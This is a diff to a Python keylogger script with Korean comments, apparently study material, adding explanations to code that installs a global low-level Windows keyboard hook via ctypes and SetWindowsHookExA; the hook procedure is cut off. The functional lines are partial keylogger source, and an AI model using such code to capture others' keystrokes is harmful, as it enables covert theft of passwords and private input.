@@ -1,7 +1,7 @@
 
 # import [모듈/속성명]으로 모듈과 속성을 로드함
 import sys
-from ctypes import *
+from ctypes import * #ctypes가 stdcall 호출 규칙 지원
 from ctypes.wintypes import MSG
 from ctypes.wintypes import DWORD
 
@@ -16,7 +16,7 @@ CTRL_CODE = 162
 
 # 키보드 후킹을 위한 키로거 클래스 선언
 class keyLogger:
-    def __init__(self):
+    def __init__(self): # 초기 메소드
         self.lUser32 = user32 # 클래스에서 쓸 lUser32 멤버 선언
         self.hooked = None # 후킹 여부 (후킹되지 않음; 초기치)
     
@@ -27,7 +27,7 @@ class keyLogger:
         self.hooked = self.lUser32.SetWindowsHookExA(
             WH_KEYBOARD_LL,
             pointer,
-            kernel32.GetModuleHandleA(None),
+            kernel32.GetModuleHandleA(None), # 후킹을 설정할 스레드 설정(None=글로벌, other=특정 로컬 스레드)
             0
         )
         # 후킹이 되지 않으면 False(안됨 리턴), 되면 True(되었음)
@@ -46,7 +46,7 @@ class keyLogger:
 # CFUNCTYPE()으로 콜 백 함수 포인터를 선언해서 CMPFUNC로 함수를 호출하는 getFPTR() 함수
 def getFPTR(fn):
     CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
-    return CMPFUNC(fn)
+    return CMPFUNC(fn) # CMPFUNC 메소드로 fn 함수 주소 구해서 반환
     
 # 후킹 프로시저 함수
 def hookProc(nCode, wParam, lParam):
